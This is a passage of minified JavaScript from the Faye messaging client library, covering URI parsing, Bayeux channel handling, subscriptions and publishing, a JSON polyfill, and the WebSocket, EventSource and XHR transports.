i[t]=e,""})),i[t]=i[t]||""};n("protocol",/^[a-z]+:/i),n("host",/^\/\/[^\/\?#]+/),/^\//.test(e)||i.host||(e=a.ENV.location.pathname.replace(/[^\/]*$/,"")+e),n("pathname",/^[^\?#]*/),n("search",/^\?[^#]*/),n("hash",/^#.*/),i.protocol=i.protocol||a.ENV.location.protocol,i.host?(i.host=i.host.substr(2),n=i.host.split(":"),i.hostname=n[0],i.port=n[1]||""):(i.host=a.ENV.location.host,i.hostname=a.ENV.location.hostname,i.port=a.ENV.location.port),i.pathname=i.pathname||"/",i.path=i.pathname+i.search;var s=(n=i.search.replace(/^\?/,""))?n.split("&"):[],o={},r=0;for(t=s.length;r<t;r++)n=s[r].split("="),o[decodeURIComponent(n[0]||"")]=decodeURIComponent(n[1]||"");return i.query=o,i.href=this.stringify(i),i},stringify:function(e){var t=e.protocol+"//"+e.hostname;return e.port&&(t+=":"+e.port),t+(e.pathname+this.queryString(e.query)+(e.hash||""))},queryString:function(e){var t,i=[];for(t in e)e.hasOwnProperty(t)&&i.push(encodeURIComponent(t)+"="+encodeURIComponent(e[t]));return 0===i.length?"":"?"+i.join("&")}},a.Error=a.Class({initialize:function(e,t,i){this.code=e,this.params=Array.prototype.slice.call(t),this.message=i},toString:function(){return this.code+":"+this.params.join(",")+":"+this.message}}),a.Error.parse=function(e){return e=e||"",a.Grammar.ERROR.test(e)?(e=e.split(":"),new this(parseInt(e[0]),e[1].split(","),e=e[2])):new this(null,[],e)},a.Error.versionMismatch=function(){return new this(300,arguments,"Version mismatch").toString()},a.Error.conntypeMismatch=function(){return new this(301,arguments,"Connection types not supported").toString()},a.Error.extMismatch=function(){return new this(302,arguments,"Extension mismatch").toString()},a.Error.badRequest=function(){return new this(400,arguments,"Bad request").toString()},a.Error.clientUnknown=function(){return new this(401,arguments,"Unknown client").toString()},a.Error.parameterMissing=function(){return new this(402,arguments,"Missing required parameter").toString()},a.Error.channelForbidden=function(){return new this(403,arguments,"Forbidden channel").toString()},a.Error.channelUnknown=function(){return new this(404,arguments,"Unknown channel").toString()},a.Error.channelInvalid=function(){return new this(405,arguments,"Invalid channel").toString()},a.Error.extUnknown=function(){return new this(406,arguments,"Unknown extension").toString()},a.Error.publishFailed=function(){return new this(407,arguments,"Failed to publish").toString()},a.Error.serverError=function(){return new this(500,arguments,"Internal server error").toString()},a.Deferrable={then:function(e,t){var i=this;return this._promise||(this._promise=new a.Promise((function(e,t){i._fulfill=e,i._reject=t}))),0===arguments.length?this._promise:this._promise.then(e,t)},callback:function(e,t){return this.then((function(i){e.call(t,i)}))},errback:function(e,t){return this.then(null,(function(i){e.call(t,i)}))},timeout:function(e,t){this.then();var i=this;this._timer=a.ENV.setTimeout((function(){i._reject(t)}),1e3*e)},setDeferredStatus:function(e,t){this._timer&&a.ENV.clearTimeout(this._timer),this.then(),"succeeded"===e?this._fulfill(t):"failed"===e?this._reject(t):delete this._promise}},a.Publisher={countListeners:function(e){return this.listeners(e).length},bind:function(e,t,i){var n=Array.prototype.slice,s=function(){t.apply(i,n.call(arguments))};return this._listeners=this._listeners||[],this._listeners.push([e,t,i,s]),this.on(e,s)},unbind:function(e,t,i){this._listeners=this._listeners||[];for(var n,s=this._listeners.length;s--;)(n=this._listeners[s])[0]!==e||t&&(n[1]!==t||n[2]!==i)||(this._listeners.splice(s,1),this.removeListener(e,n[3]))}},a.extend(a.Publisher,a.EventEmitter.prototype),a.Publisher.trigger=a.Publisher.emit,a.Timeouts={addTimeout:function(e,t,i,n){if(this._timeouts=this._timeouts||{},!this._timeouts.hasOwnProperty(e)){var s=this;this._timeouts[e]=a.ENV.setTimeout((function(){delete s._timeouts[e],i.call(n)}),1e3*t)}},removeTimeout:function(e){this._timeouts=this._timeouts||{};var t=this._timeouts[e];t&&(a.ENV.clearTimeout(t),delete this._timeouts[e])},removeAllTimeouts:function(){for(var e in this._timeouts=this._timeouts||{},this._timeouts)this.removeTimeout(e)}},a.Logging={LOG_LEVELS:{fatal:4,error:3,warn:2,info:1,debug:0},writeLog:function(e,t){if(a.logger){var i=Array.prototype.slice.apply(e);e="[Faye";var n,s=this.className,o=i.shift().replace(/\?/g,(function(){try{return a.toJSON(i.shift())}catch(e){return"[Object]"}}));for(n in a)s||"function"==typeof a[n]&&this instanceof a[n]&&(s=n);s&&(e+="."+s),e+="] ","function"==typeof a.logger[t]?a.logger[t](e+o):"function"==typeof a.logger&&a.logger(e+o)}}},function(){for(var e in a.Logging.LOG_LEVELS)!function(e){a.Logging[e]=function(){this.writeLog(arguments,e)}}(e)}(),a.Grammar={CHANNEL_NAME:/^\/(((([a-z]|[A-Z])|[0-9])|(\-|_|!|~|\(|\)|\$|@)))+(\/(((([a-z]|[A-Z])|[0-9])|(\-|_|!|~|\(|\)|\$|@)))+)*$/,CHANNEL_PATTERN:/^(\/(((([a-z]|[A-Z])|[0-9])|(\-|_|!|~|\(|\)|\$|@)))+)*\/\*{1,2}$/,ERROR:/^([0-9][0-9][0-9]:(((([a-z]|[A-Z])|[0-9])|(\-|_|!|~|\(|\)|\$|@)| |\/|\*|\.))*(,(((([a-z]|[A-Z])|[0-9])|(\-|_|!|~|\(|\)|\$|@)| |\/|\*|\.))*)*:(((([a-z]|[A-Z])|[0-9])|(\-|_|!|~|\(|\)|\$|@)| |\/|\*|\.))*|[0-9][0-9][0-9]::(((([a-z]|[A-Z])|[0-9])|(\-|_|!|~|\(|\)|\$|@)| |\/|\*|\.))*)$/,VERSION:/^([0-9])+(\.(([a-z]|[A-Z])|[0-9])(((([a-z]|[A-Z])|[0-9])|\-|_))*)*$/},a.Extensible={addExtension:function(e){this._extensions=this._extensions||[],this._extensions.push(e),e.added&&e.added(this)},removeExtension:function(e){if(this._extensions)for(var t=this._extensions.length;t--;)this._extensions[t]===e&&(this._extensions.splice(t,1),e.removed&&e.removed(this))},pipeThroughExtensions:function(e,t,i,n,s){if(this.debug("Passing through ? extensions: ?",e,t),!this._extensions)return n.call(s,t);var o=this._extensions.slice(),a=function(t){if(!t)return n.call(s,t);var r=o.shift();if(!r)return n.call(s,t);var c=r[e];if(!c)return a(t);3<=c.length?r[e](t,i,a):r[e](t,a)};a(t)}},a.extend(a.Extensible,a.Logging),a.Channel=a.Class({initialize:function(e){this.id=this.name=e},push:function(e){this.trigger("message",e)},isUnused:function(){return 0===this.countListeners("message")}}),a.extend(a.Channel.prototype,a.Publisher),a.extend(a.Channel,{HANDSHAKE:"/meta/handshake",CONNECT:"/meta/connect",SUBSCRIBE:"/meta/subscribe",UNSUBSCRIBE:"/meta/unsubscribe",DISCONNECT:"/meta/disconnect",META:"meta",SERVICE:"service",expand:function(e){var t=this.parse(e);e=["/**",e];var i=t.slice();i[i.length-1]="*",e.push(this.unparse(i));for(var n=1,s=t.length;n<s;n++)(i=t.slice(0,n)).push("**"),e.push(this.unparse(i));return e},isValid:function(e){return a.Grammar.CHANNEL_NAME.test(e)||a.Grammar.CHANNEL_PATTERN.test(e)},parse:function(e){return this.isValid(e)?e.split("/").slice(1):null},unparse:function(e){return"/"+e.join("/")},isMeta:function(e){return(e=this.parse(e))?e[0]===this.META:null},isService:function(e){return(e=this.parse(e))?e[0]===this.SERVICE:null},isSubscribable:function(e){return this.isValid(e)?!this.isMeta(e)&&!this.isService(e):null},Set:a.Class({initialize:function(){this._channels={}},getKeys:function(){var e,t=[];for(e in this._channels)t.push(e);return t},remove:function(e){delete this._channels[e]},hasSubscription:function(e){return this._channels.hasOwnProperty(e)},subscribe:function(e,t,i){for(var n,s=0,o=e.length;s<o;s++)n=e[s],n=this._channels[n]=this._channels[n]||new a.Channel(n),t&&n.bind("message",t,i)},unsubscribe:function(e,t,i){var n=this._channels[e];return!!n&&(n.unbind("message",t,i),!!n.isUnused()&&(this.remove(e),!0))},distributeMessage:function(e){for(var t=a.Channel.expand(e.channel),i=0,n=t.length;i<n;i++){var s=this._channels[t[i]];s&&s.trigger("message",e.data)}}})}),a.Publication=a.Class(a.Deferrable),a.Subscription=a.Class({initialize:function(e,t,i,n){this._client=e,this._channels=t,this._callback=i,this._context=n,this._cancelled=!1},cancel:function(){this._cancelled||(this._client.unsubscribe(this._channels,this._callback,this._context),this._cancelled=!0)},unsubscribe:function(){this.cancel()}}),a.extend(a.Subscription.prototype,a.Deferrable),a.Client=a.Class({UNCONNECTED:1,CONNECTING:2,CONNECTED:3,DISCONNECTED:4,HANDSHAKE:"handshake",RETRY:"retry",NONE:"none",CONNECTION_TIMEOUT:60,DEFAULT_ENDPOINT:"/bayeux",INTERVAL:0,initialize:function(e,t){this.info("New client created for ?",e),t=t||{},a.validateOptions(t,"interval timeout endpoints proxy retry scheduler websocketExtensions tls ca".split(" ")),this._endpoint=e||this.DEFAULT_ENDPOINT,this._channels=new a.Channel.Set,this._dispatcher=new a.Dispatcher(this,this._endpoint,t),this._messageId=0,this._state=this.UNCONNECTED,this._responseCallbacks={},this._advice={reconnect:this.RETRY,interval:1e3*(t.interval||this.INTERVAL),timeout:1e3*(t.timeout||this.CONNECTION_TIMEOUT)},this._dispatcher.timeout=this._advice.timeout/1e3,this._dispatcher.bind("message",this._receiveMessage,this),a.Event&&void 0!==a.ENV.onbeforeunload&&a.Event.on(a.ENV,"beforeunload",(function(){0>a.indexOf(this._dispatcher._disabled,"autodisconnect")&&this.disconnect()}),this)},addWebsocketExtension:function(e){return this._dispatcher.addWebsocketExtension(e)},disable:function(e){return this._dispatcher.disable(e)},setHeader:function(e,t){return this._dispatcher.setHeader(e,t)},handshake:function(e,t){if(this._advice.reconnect!==this.NONE&&this._state===this.UNCONNECTED){this._state=this.CONNECTING;var i=this;this.info("Initiating handshake with ?",a.URI.stringify(this._endpoint)),this._dispatcher.selectTransport(a.MANDATORY_CONNECTION_TYPES),this._sendMessage({channel:a.Channel.HANDSHAKE,version:a.BAYEUX_VERSION,supportedConnectionTypes:this._dispatcher.getConnectionTypes()},{},(function(n){n.successful?(this._state=this.CONNECTED,this._dispatcher.clientId=n.clientId,this._dispatcher.selectTransport(n.supportedConnectionTypes),this.info("Handshake successful: ?",this._dispatcher.clientId),this.subscribe(this._channels.getKeys(),!0),e&&a.Promise.defer((function(){e.call(t)}))):(this.info("Handshake unsuccessful"),a.ENV.setTimeout((function(){i.handshake(e,t)}),1e3*this._dispatcher.retry),this._state=this.UNCONNECTED)}),this)}},connect:function(e,t){if(this._advice.reconnect!==this.NONE&&this._state!==this.DISCONNECTED){if(this._state===this.UNCONNECTED)return this.handshake((function(){this.connect(e,t)}),this);this.callback(e,t),this._state===this.CONNECTED&&(this.info("Calling deferred actions for ?",this._dispatcher.clientId),this.setDeferredStatus("succeeded"),this.setDeferredStatus("unknown"),this._connectRequest||(this._connectRequest=!0,this.info("Initiating connection for ?",this._dispatcher.clientId),this._sendMessage({channel:a.Channel.CONNECT,clientId:this._dispatcher.clientId,connectionType:this._dispatcher.connectionType},{},this._cycleConnection,this)))}},disconnect:function(){if(this._state===this.CONNECTED){this._state=this.DISCONNECTED,this.info("Disconnecting ?",this._dispatcher.clientId);var e=new a.Publication;return this._sendMessage({channel:a.Channel.DISCONNECT,clientId:this._dispatcher.clientId},{},(function(t){t.successful?(this._dispatcher.close(),e.setDeferredStatus("succeeded")):e.setDeferredStatus("failed",a.Error.parse(t.error))}),this),this.info("Clearing channel listeners for ?",this._dispatcher.clientId),this._channels=new a.Channel.Set,e}},subscribe:function(e,t,i){if(e instanceof Array)return a.map(e,(function(e){return this.subscribe(e,t,i)}),this);var n=new a.Subscription(this,e,t,i),s=!0===t;return this._channels.hasSubscription(e)&&!s?(this._channels.subscribe([e],t,i),n.setDeferredStatus("succeeded"),n):(this.connect((function(){this.info("Client ? attempting to subscribe to ?",this._dispatcher.clientId,e),s||this._channels.subscribe([e],t,i),this._sendMessage({channel:a.Channel.SUBSCRIBE,clientId:this._dispatcher.clientId,subscription:e},{},(function(s){if(!s.successful)return n.setDeferredStatus("failed",a.Error.parse(s.error)),this._channels.unsubscribe(e,t,i);s=[].concat(s.subscription),this.info("Subscription acknowledged for ? to ?",this._dispatcher.clientId,s),n.setDeferredStatus("succeeded")}),this)}),this),n)},unsubscribe:function(e,t,i){if(e instanceof Array)return a.map(e,(function(e){return this.unsubscribe(e,t,i)}),this);this._channels.unsubscribe(e,t,i)&&this.connect((function(){this.info("Client ? attempting to unsubscribe from ?",this._dispatcher.clientId,e),this._sendMessage({channel:a.Channel.UNSUBSCRIBE,clientId:this._dispatcher.clientId,subscription:e},{},(function(e){e.successful&&(e=[].concat(e.subscription),this.info("Unsubscription acknowledged for ? from ?",this._dispatcher.clientId,e))}),this)}),this)},publish:function(e,t,i){a.validateOptions(i||{},["attempts","deadline"]);var n=new a.Publication;return this.connect((function(){this.info("Client ? queueing published message to ?: ?",this._dispatcher.clientId,e,t),this._sendMessage({channel:e,data:t,clientId:this._dispatcher.clientId},i,(function(e){e.successful?n.setDeferredStatus("succeeded"):n.setDeferredStatus("failed",a.Error.parse(e.error))}),this)}),this),n},_sendMessage:function(e,t,i,n){e.id=this._generateMessageId();var s=this._advice.timeout?1.2*this._advice.timeout/1e3:1.2*this._dispatcher.retry;this.pipeThroughExtensions("outgoing",e,null,(function(e){e&&(i&&(this._responseCallbacks[e.id]=[i,n]),this._dispatcher.sendMessage(e,s,t||{}))}),this)},_generateMessageId:function(){return this._messageId+=1,this._messageId>=Math.pow(2,32)&&(this._messageId=0),this._messageId.toString(36)},_receiveMessage:function(e){var t=e.id;if(void 0!==e.successful){var i=this._responseCallbacks[t];delete this._responseCallbacks[t]}this.pipeThroughExtensions("incoming",e,null,(function(e){e&&(e.advice&&this._handleAdvice(e.advice),this._deliverMessage(e),i&&i[0].call(i[1],e))}),this)},_handleAdvice:function(e){a.extend(this._advice,e),this._dispatcher.timeout=this._advice.timeout/1e3,this._advice.reconnect===this.HANDSHAKE&&this._state!==this.DISCONNECTED&&(this._state=this.UNCONNECTED,this._dispatcher.clientId=null,this._cycleConnection())},_deliverMessage:function(e){e.channel&&void 0!==e.data&&(this.info("Client ? calling listeners for ? with ?",this._dispatcher.clientId,e.channel,e.data),this._channels.distributeMessage(e))},_cycleConnection:function(){this._connectRequest&&(this._connectRequest=null,this.info("Closed connection for ?",this._dispatcher.clientId));var e=this;a.ENV.setTimeout((function(){e.connect()}),this._advice.interval)}}),a.extend(a.Client.prototype,a.Deferrable),a.extend(a.Client.prototype,a.Publisher),a.extend(a.Client.prototype,a.Logging),a.extend(a.Client.prototype,a.Extensible),a.Dispatcher=a.Class({MAX_REQUEST_SIZE:2048,DEFAULT_RETRY:5,UP:1,DOWN:2,initialize:function(e,t,i){if(this._client=e,this.endpoint=a.URI.parse(t),this._alternates=i.endpoints||{},this.cookies=a.Cookies&&new a.Cookies.CookieJar,this._disabled=[],this._envelopes={},this.headers={},this.retry=i.retry||this.DEFAULT_RETRY,this._scheduler=i.scheduler||a.Scheduler,this._state=0,this.transports={},this.wsExtensions=[],this.proxy=i.proxy||{},"string"==typeof this._proxy&&(this._proxy={origin:this._proxy}),e=i.websocketExtensions){t=0;for(var n=(e=[].concat(e)).length;t<n;t++)this.addWebsocketExtension(e[t])}for(var s in this.tls=i.tls||{},this.tls.ca=this.tls.ca||i.ca,this._alternates)this._alternates[s]=a.URI.parse(this._alternates[s]);this.maxRequestSize=this.MAX_REQUEST_SIZE},endpointFor:function(e){return this._alternates[e]||this.endpoint},addWebsocketExtension:function(e){this.wsExtensions.push(e)},disable:function(e){this._disabled.push(e)},setHeader:function(e,t){this.headers[e]=t},close:function(){var e=this._transport;delete this._transport,e&&e.close()},getConnectionTypes:function(){return a.Transport.getConnectionTypes()},selectTransport:function(e){a.Transport.get(this,e,this._disabled,(function(e){this.debug("Selected ? transport for ?",e.connectionType,a.URI.stringify(e.endpoint)),e!==this._transport&&(this._transport&&this._transport.close(),this._transport=e,this.connectionType=e.connectionType)}),this)},sendMessage:function(e,t,i){i=i||{};var n=e.id,s=i.attempts;i=i.deadline&&(new Date).getTime()+1e3*i.deadline;var o=this._envelopes[n];o||(t=new this._scheduler(e,{timeout:t,interval:this.retry,attempts:s,deadline:i}),o=this._envelopes[n]={message:e,scheduler:t}),this._sendEnvelope(o)},_sendEnvelope:function(e){if(this._transport&&!e.request&&!e.timer){var t=e.message,i=e.scheduler,n=this;i.isDeliverable()?(e.timer=a.ENV.setTimeout((function(){n.handleError(t)}),1e3*i.getTimeout()),i.send(),e.request=this._transport.sendMessage(t)):(i.abort(),delete this._envelopes[t.id])}},handleResponse:function(e){var t=this._envelopes[e.id];void 0!==e.successful&&t&&(t.scheduler.succeed(),delete this._envelopes[e.id],a.ENV.clearTimeout(t.timer)),this.trigger("message",e),this._state!==this.UP&&(this._state=this.UP,this._client.trigger("transport:up"))},handleError:function(e,t){var i=this._envelopes[e.id];e=i&&i.request;var n=this;e&&(e.then((function(e){e&&e.abort&&e.abort()})),(e=i.scheduler).fail(),a.ENV.clearTimeout(i.timer),i.request=i.timer=null,t?this._sendEnvelope(i):i.timer=a.ENV.setTimeout((function(){i.timer=null,n._sendEnvelope(i)}),1e3*e.getInterval()),this._state!==this.DOWN&&(this._state=this.DOWN,this._client.trigger("transport:down")))}}),a.extend(a.Dispatcher.prototype,a.Publisher),a.extend(a.Dispatcher.prototype,a.Logging),a.Scheduler=function(e,t){this.message=e,this.options=t,this.attempts=0},a.extend(a.Scheduler.prototype,{getTimeout:function(){return this.options.timeout},getInterval:function(){return this.options.interval},isDeliverable:function(){var e=this.options.attempts,t=this.attempts,i=this.options.deadline,n=(new Date).getTime();return!(void 0!==e&&t>=e||void 0!==i&&n>i)},send:function(){this.attempts+=1},succeed:function(){},fail:function(){},abort:function(){}}),a.Transport=a.extend(a.Class({DEFAULT_PORTS:{"http:":80,"https:":443,"ws:":80,"wss:":443},SECURE_PROTOCOLS:["https:","wss:"],MAX_DELAY:0,batching:!0,initialize:function(e,t){this._dispatcher=e,this.endpoint=t,this._outbox=[],this._proxy=a.extend({},this._dispatcher.proxy),!this._proxy.origin&&a.NodeAdapter&&(this._proxy.origin=0<=a.indexOf(this.SECURE_PROTOCOLS,this.endpoint.protocol)?process.env.HTTPS_PROXY||process.env.https_proxy:process.env.HTTP_PROXY||process.env.http_proxy)},close:function(){},encode:function(e){return""},sendMessage:function(e){return this.debug("Client ? sending message to ?: ?",this._dispatcher.clientId,a.URI.stringify(this.endpoint),e),this.batching?(this._outbox.push(e),this._flushLargeBatch(),e.channel===a.Channel.HANDSHAKE?this._publish(.01):(e.channel===a.Channel.CONNECT&&(this._connectMessage=e),this._publish(this.MAX_DELAY))):a.Promise.fulfilled(this.request([e]))},_publish:function(e){return this._promise=this._promise||new a.Promise,this.addTimeout("publish",e,(function(){this._flush(),delete this._promise}),this),this._promise},_flush:function(){this.removeTimeout("publish"),1<this._outbox.length&&this._connectMessage&&(this._connectMessage.advice={timeout:0}),a.Promise.fulfill(this._promise,this.request(this._outbox)),this._connectMessage=null,this._outbox=[]},_flushLargeBatch:function(){if(!(this.encode(this._outbox).length<this._dispatcher.maxRequestSize)){var e=this._outbox.pop();this._promise=this._promise||new a.Promise,this._flush(),e&&this._outbox.push(e)}},_receive:function(e){if(e){e=[].concat(e),this.debug("Client ? received from ? via ?: ?",this._dispatcher.clientId,a.URI.stringify(this.endpoint),this.connectionType,e);for(var t=0,i=e.length;t<i;t++)this._dispatcher.handleResponse(e[t])}},_handleError:function(e,t){e=[].concat(e),this.debug("Client ? failed to send to ? via ?: ?",this._dispatcher.clientId,a.URI.stringify(this.endpoint),this.connectionType,e),t=0;for(var i=e.length;t<i;t++)this._dispatcher.handleError(e[t])},_getCookies:function(){var e=this._dispatcher.cookies,t=a.URI.stringify(this.endpoint);return e?a.map(e.getCookiesSync(t),(function(e){return e.cookieString()})).join("; "):""},_storeCookies:function(e){var t=this._dispatcher.cookies,i=a.URI.stringify(this.endpoint);if(e&&t)for(var n=0,s=(e=[].concat(e)).length;n<s;n++){var o=a.Cookies.Cookie.parse(e[n]);t.setCookieSync(o,i)}}}),{get:function(e,t,i,n,s){var o=e.endpoint;a.asyncEach(this._transports,(function(o,r){var c=o[0],h=o[1],d=e.endpointFor(c);return 0<=a.indexOf(i,c)?r():0>a.indexOf(t,c)?(h.isUsable(e,d,(function(){})),r()):void h.isUsable(e,d,(function(t){if(!t)return r();t=h.hasOwnProperty("create")?h.create(e,d):new h(e,d),n.call(s,t)}))}),(function(){throw Error("Could not find a usable connection type for "+a.URI.stringify(o))}))},register:function(e,t){this._transports.push([e,t]),t.prototype.connectionType=e},getConnectionTypes:function(){return a.map(this._transports,(function(e){return e[0]}))},_transports:[]}),a.extend(a.Transport.prototype,a.Logging),a.extend(a.Transport.prototype,a.Timeouts),a.Event={_registry:[],on:function(e,t,i,n){var s=function(){i.call(n)};e.addEventListener?e.addEventListener(t,s,!1):e.attachEvent("on"+t,s),this._registry.push({_element:e,_type:t,_callback:i,_context:n,_handler:s})},detach:function(e,t,i,n){for(var s,o=this._registry.length;o--;)s=this._registry[o],e&&e!==s._element||t&&t!==s._type||i&&i!==s._callback||n&&n!==s._context||(s._element.removeEventListener?s._element.removeEventListener(s._type,s._handler,!1):s._element.detachEvent("on"+s._type,s._handler),this._registry.splice(o,1))}},void 0!==a.ENV.onunload&&a.Event.on(a.ENV,"unload",a.Event.detach,a.Event),"object"!=typeof JSON&&(JSON={}),function(){function b(e){return 10>e?"0"+e:e}function c(e){return g.lastIndex=0,g.test(e)?'"'+e.replace(g,(function(e){var t=f[e];return"string"==typeof t?t:"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)}))+'"':'"'+e+'"'}function d(e,t){var i=h,n=t[e];switch(n&&"object"==typeof n&&"function"==typeof n.toJSON&&(n=n.toJSON(e)),"function"==typeof m&&(n=m.call(t,e,n)),typeof n){case"string":return c(n);case"number":return isFinite(n)?String(n):"null";case"boolean":case"null":return String(n);case"object":if(!n)return"null";h+=l;var s=[];if("[object Array]"===Object.prototype.toString.apply(n)){var o=n.length;for(e=0;e<o;e+=1)s[e]=d(e,n)||"null";return t=0===s.length?"[]":h?"[\n"+h+s.join(",\n"+h)+"\n"+i+"]":"["+s.join(",")+"]",h=i,t}if(m&&"object"==typeof m){for(o=m.length,e=0;e<o;e+=1)if("string"==typeof m[e]){var a=m[e];(t=d(a,n))&&s.push(c(a)+(h?": ":":")+t)}}else for(a in n)Object.prototype.hasOwnProperty.call(n,a)&&(t=d(a,n))&&s.push(c(a)+(h?": ":":")+t);return t=0===s.length?"{}":h?"{\n"+h+s.join(",\n"+h)+"\n"+i+"}":"{"+s.join(",")+"}",h=i,t}}"function"!=typeof Date.prototype.toJSON&&(Date.prototype.toJSON=function(){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+b(this.getUTCMonth()+1)+"-"+b(this.getUTCDate())+"T"+b(this.getUTCHours())+":"+b(this.getUTCMinutes())+":"+b(this.getUTCSeconds())+"Z":null},String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(){return this.valueOf()});var e=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,g=/[\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,h,l,f={"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},m;a.stringify=function(e,t,i){var n;if(l=h="","number"==typeof i)for(n=0;n<i;n+=1)l+=" ";else"string"==typeof i&&(l=i);if((m=t)&&"function"!=typeof t&&("object"!=typeof t||"number"!=typeof t.length))throw Error("JSON.stringify");return d("",{"":e})},"function"!=typeof JSON.stringify&&(JSON.stringify=a.stringify),"function"!=typeof JSON.parse&&(JSON.parse=function(a,b){function c(e,t){var i,n=e[t];if(n&&"object"==typeof n)for(i in n)if(Object.prototype.hasOwnProperty.call(n,i)){var s=c(n,i);void 0!==s?n[i]=s:delete n[i]}return b.call(e,t,n)}if(a=String(a),e.lastIndex=0,e.test(a)&&(a=a.replace(e,(function(e){return"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)}))),/^[\],:{}\s]*$/.test(a.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return a=eval("("+a+")"),"function"==typeof b?c({"":a},""):a;throw new SyntaxError("JSON.parse")})}(),a.Transport.WebSocket=a.extend(a.Class(a.Transport,{UNCONNECTED:1,CONNECTING:2,CONNECTED:3,batching:!1,isUsable:function(e,t){this.callback((function(){e.call(t,!0)})),this.errback((function(){e.call(t,!1)})),this.connect()},request:function(e){this._pending=this._pending||new a.Set;for(var t=0,i=e.length;t<i;t++)this._pending.add(e[t]);var n=new a.Promise;return this.callback((function(t){t&&1===t.readyState&&(t.send(a.toJSON(e)),a.Promise.fulfill(n,t))}),this),this.connect(),{abort:function(){n.then((function(e){e.close()}))}}},connect:function(){if(!a.Transport.WebSocket._unloaded&&(this._state=this._state||this.UNCONNECTED,this._state===this.UNCONNECTED)){this._state=this.CONNECTING;var e=this._createSocket();if(!e)return this.setDeferredStatus("failed");var t=this;e.onopen=function(){e.headers&&t._storeCookies(e.headers["set-cookie"]),t._socket=e,t._state=t.CONNECTED,t._everConnected=!0,t._ping(),t.setDeferredStatus("succeeded",e)};var i=!1;e.onclose=e.onerror=function(){if(!i){i=!0;var n=t._state===t.CONNECTED;e.onopen=e.onclose=e.onerror=e.onmessage=null,delete t._socket,t._state=t.UNCONNECTED,t.removeTimeout("ping");var s=t._pending?t._pending.toArray():[];delete t._pending,n||t._everConnected?(t.setDeferredStatus("unknown"),t._handleError(s,n)):t.setDeferredStatus("failed")}},e.onmessage=function(e){if(e=JSON.parse(e.data)){for(var i=0,n=(e=[].concat(e)).length;i<n;i++)void 0!==e[i].successful&&t._pending.remove(e[i]);t._receive(e)}}}},close:function(){this._socket&&this._socket.close()},_createSocket:function(){var e=a.Transport.WebSocket.getSocketUrl(this.endpoint),t=this._dispatcher.headers,i=this._dispatcher.wsExtensions,n=this._getCookies();return t={extensions:i,headers:t,proxy:this._proxy,tls:this._dispatcher.tls},""!==n&&(t.headers.Cookie=n),a.WebSocket?new a.WebSocket.Client(e,[],t):a.ENV.MozWebSocket?new MozWebSocket(e):a.ENV.WebSocket?new WebSocket(e):void 0},_ping:function(){this._socket&&1===this._socket.readyState&&(this._socket.send("[]"),this.addTimeout("ping",this._dispatcher.timeout/2,this._ping,this))}}),{PROTOCOLS:{"http:":"ws:","https:":"wss:"},create:function(e,t){var i=e.transports.websocket=e.transports.websocket||{};return i[t.href]=i[t.href]||new this(e,t),i[t.href]},getSocketUrl:function(e){return(e=a.copyObject(e)).protocol=this.PROTOCOLS[e.protocol],a.URI.stringify(e)},isUsable:function(e,t,i,n){this.create(e,t).isUsable(i,n)}}),a.extend(a.Transport.WebSocket.prototype,a.Deferrable),a.Transport.register("websocket",a.Transport.WebSocket),a.Event&&void 0!==a.ENV.onbeforeunload&&a.Event.on(a.ENV,"beforeunload",(function(){a.Transport.WebSocket._unloaded=!0})),a.Transport.EventSource=a.extend(a.Class(a.Transport,{initialize:function(e,t){if(a.Transport.prototype.initialize.call(this,e,t),!a.ENV.EventSource)return this.setDeferredStatus("failed");this._xhr=new a.Transport.XHR(e,t),(t=a.copyObject(t)).pathname+="/"+e.clientId;var i=new EventSource(a.URI.stringify(t)),n=this;i.onopen=function(){n._everConnected=!0,n.setDeferredStatus("succeeded")},i.onerror=function(){n._everConnected?n._handleError([]):(n.setDeferredStatus("failed"),i.close())},i.onmessage=function(e){n._receive(JSON.parse(e.data))},this._socket=i},close:function(){this._socket&&(this._socket.onopen=this._socket.onerror=this._socket.onmessage=null,this._socket.close(),delete this._socket)},isUsable:function(e,t){this.callback((function(){e.call(t,!0)})),this.errback((function(){e.call(t,!1)}))},encode:function(e){return this._xhr.encode(e)},request:function(e){return this._xhr.request(e)}}),{isUsable:function(e,t,i,n){if(!e.clientId)return i.call(n,!1);a.Transport.XHR.isUsable(e,t,(function(s){if(!s)return i.call(n,!1);this.create(e,t).isUsable(i,n)}),this)},create:function(e,t){var i=e.transports.eventsource=e.transports.eventsource||{},n=e.clientId,s=a.copyObject(t);return s.pathname+="/"+(n||""),i[s=a.URI.stringify(s)]=i[s]||new this(e,t),i[s]}}),a.extend(a.Transport.EventSource.prototype,a.Deferrable),a.Transport.register("eventsource",a.Transport.EventSource),a.Transport.XHR=a.extend(a.Class(a.Transport,{encode:function(e){return a.toJSON(e)},request:function(e){var t=this.endpoint.href,i=this;try{var n=new XMLHttpRequest}catch(e){n=a.ENV.ActiveXObject?new ActiveXObject("Microsoft.XMLHTTP"):new XMLHttpRequest}for(var s in n.open("POST",t,!0),n.setRequestHeader("Content-Type","application/json"),n.setRequestHeader("Pragma","no-cache"),n.setRequestHeader("X-Requested-With","XMLHttpRequest"),t=this._dispatcher.headers)t.hasOwnProperty(s)&&n.setRequestHeader(s,t[s]);var o=function(){n.abort()};return void 0!==a.ENV.onbeforeunload&&a.Event.on(a.ENV,"beforeunload",o),n.onreadystatechange=function(){if(n&&4===n.readyState){var t=null,s=n.status,r=n.responseText;if(s=200<=s&&300>s||304===s||1223===s,void 0!==a.ENV.onbeforeunload&&a.Event.detach(a.ENV,"beforeunload",o),n.onreadystatechange=function(){},n=null,!s)return 